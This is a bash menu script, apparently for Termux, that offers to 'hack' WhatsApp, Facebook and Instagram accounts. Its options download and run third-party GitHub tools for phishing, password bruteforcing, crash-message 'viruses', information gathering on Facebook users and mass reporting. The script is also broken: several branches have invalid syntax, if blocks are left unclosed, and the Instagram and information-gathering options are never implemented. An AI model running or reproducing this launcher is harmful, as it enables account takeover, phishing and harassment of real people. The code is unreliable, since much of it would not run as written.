#!/bin/bash
echo -e "
$rset        $blue select (type the number)

            (1) whatsapp-hack

            (2) fb hack

            (3) insta hack

            (4) information gathering


"
echo -e "
         {{{{(((( Just write the number ))))}}}}
"
      # 2nd read statement
      read -p " Enter Your Choice :- " choice

      if [ $choice = 1 ];then

      echo -e "

                 (1)   wha bot

                 (2)   wha phishing

                 (3)  moded wha

                 (4)  virus and crash txt "

                 read -p "enter your option :-" whachoice

                 if [ $whachoice = 1 ];then
sleep 4
termux-open-url https://github.com/DRACULA-HACK/whatsapp-bot-md

               elif [ $whachoice = 2 ];then
cd $home
               git clone https://github.com/Ignitetch/AdvPhishing.git
cd AdvPhishing/
chmod 777 *
./Android-Setup.sh
./AdvPhishing.sh

               elif [ $whachoice = 3];then
termux-open-url https://www.youtube.com/c/TROKSMODS
               elif [ $whachoice = 4 ];then
               apt update

apt upgrade -y

pkg install git -y

 git clone https://github.com/Devil-Tigers/TigerVirus.git

cd TigerVirus

 bash TigerVirus.sh

if [ $choice = 2 ];then
echo -e"

        (1)  fb phishing

        (2) fb bruteforce

        (3) fb inf gathering

        (4) fb report

        "

read -p " Enter Your Choice :- " fbtool

if [$fbtool = 1 ];then
cd $home
git clone https://github.com/htr-tech/zphisher.git

cd zphisher
bash zphisher.sh
else [ $fbtool = 2 ];then
cd $home
git clone https://github.com/IAmBlackHacker/Facebook-BruteForce
cd Facebook-BruteForce
python3 -m pip install requests bs4
 python3 -m pip install mechanize
python3 fb.py or python fb2.py

else [$fbtool = 3 ];then
apt update -y && apt upgrade -y
apt install git -y
apt install python2 -y
git clone https://github.com/xHak9x/fbi.git
cd fbi
pip2 install -r requirements.txt
python2 fbi.py

else [$fbtool = 4 ];then


apt install python2 -y

apt install git -y
cd $home
git clone https://github.com/bhikandeshmukh/fbreport.git

cd fbreport

ls

unzip Report.zip

python2 Report.py


fi
fi
fi
